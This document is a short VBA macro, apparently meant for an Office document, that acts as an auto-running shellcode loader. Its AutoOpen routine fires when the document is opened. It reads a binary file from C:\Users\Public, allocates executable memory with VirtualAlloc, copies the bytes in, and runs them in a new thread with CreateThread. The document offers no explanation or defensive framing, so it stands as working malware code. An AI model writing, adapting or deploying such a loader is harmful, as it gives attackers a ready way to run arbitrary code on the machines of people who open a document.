Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As Any, ByVal Source As LongPtr, ByVal Length As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, ByVal dwCreationFlags As LongPtr, ByVal lpThreadId As LongPtr) As LongPtr

Sub AutoOpen()
    RunShellcode
End Sub

Sub RunShellcode()
    Dim sc() As Byte
    Dim addr As LongPtr
    
    sc = ReadBinFile("C:\Users\Public\shellcode.bin")
    
    If (Not sc) = -1 Or UBound(sc) < 0 Then
        Exit Sub
    End If
    
    addr = VirtualAlloc(0, UBound(sc) + 1, &H1000 Or &H2000, &H40)
    If addr = 0 Then Exit Sub
    
    RtlMoveMemory ByVal addr, VarPtr(sc(0)), UBound(sc) + 1
    
    CreateThread 0, 0, addr, 0, 0, 0
End Sub

Function ReadBinFile(filePath As String) As Byte()
    Dim fileNum As Integer
    Dim fileSize As Long
    Dim fileData() As Byte
    
    If Dir(filePath) = "" Then Exit Function
    
    fileNum = FreeFile
    Open filePath For Binary As #fileNum
    fileSize = LOF(fileNum)
    
    If fileSize = 0 Then
        Close #fileNum
        Exit Function
    End If
    
    ReDim fileData(fileSize - 1)
    Get #fileNum, , fileData
    Close #fileNum
    
    ReadBinFile = fileData
End Function
